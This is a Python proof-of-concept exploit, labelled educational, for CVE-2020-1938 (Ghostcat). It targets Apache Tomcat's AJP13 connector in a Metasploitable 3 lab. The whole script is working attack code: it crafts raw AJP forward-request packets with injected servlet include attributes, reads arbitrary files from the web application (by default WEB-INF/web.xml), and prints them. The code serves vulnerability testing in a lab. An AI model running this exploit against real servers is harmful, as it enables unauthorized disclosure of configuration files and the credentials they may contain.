#!/usr/bin/env python3
"""
Script educativo para auditoría de CVE-2020-1938 (Ghostcat) en AJP13
Laboratorio: Metasploitable 3 (Windows Server 2008 R2)
"""
import sys
import socket
import struct

def ajp_read_file(target_ip, target_port=8009, file_path="WEB-INF/web.xml"):
    print(f"[*] Conectando a {target_ip}:{target_port} vía protocolo AJP13...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((target_ip, int(target_port)))
    except Exception as e:
        print(f"[-] Error de conexión: {e}")
        return

    req_uri = "/index.jsp"
    headers = [("host", f"{target_ip}:{target_port}")]
    attrs = [
        ("javax.servlet.include.request_uri", "/"),
        ("javax.servlet.include.path_info", file_path),
        ("javax.servlet.include.servlet_path", "/")
    ]

    def pack_string(st):
        b = st.encode("utf-8")
        return struct.pack(">H", len(b)) + b + b"\x00"

    body = bytearray()
    body.append(2)  # Code 2 = FORWARD_REQUEST
    body.append(2)  # Method 2 = GET
    body.extend(pack_string("HTTP/1.1"))
    body.extend(pack_string(req_uri))
    body.extend(pack_string("127.0.0.1"))
    body.extend(pack_string("localhost"))
    body.extend(pack_string(target_ip))
    body.extend(struct.pack(">H", int(target_port)))
    body.append(0)  # is_ssl = False

    # Headers
    body.extend(struct.pack(">H", len(headers)))
    for h, v in headers:
        body.extend(pack_string(h))
        body.extend(pack_string(v))

    # Inyección de atributos de Servlet (Ghostcat)
    for k, v in attrs:
        body.append(0x0A)  # req_attribute
        body.extend(pack_string(k))
        body.extend(pack_string(v))
    body.append(0xFF)  # Terminator

    packet = b"\x12\x34" + struct.pack(">H", len(body)) + body
    s.sendall(packet)

    response = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    s.close()

    idx = response.find(b"<?xml")
    if idx != -1:
        print(f"[+] ¡Vulnerabilidad confirmada! Archivo extraído ({file_path}):\n")
        print(response[idx:].decode("latin-1", errors="replace"))
    else:
        print("[-] No se encontró contenido XML en la respuesta.")

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.155"
    port = sys.argv[2] if len(sys.argv) > 2 else 8009
    path = sys.argv[3] if len(sys.argv) > 3 else "WEB-INF/web.xml"
    ajp_read_file(ip, port, path)
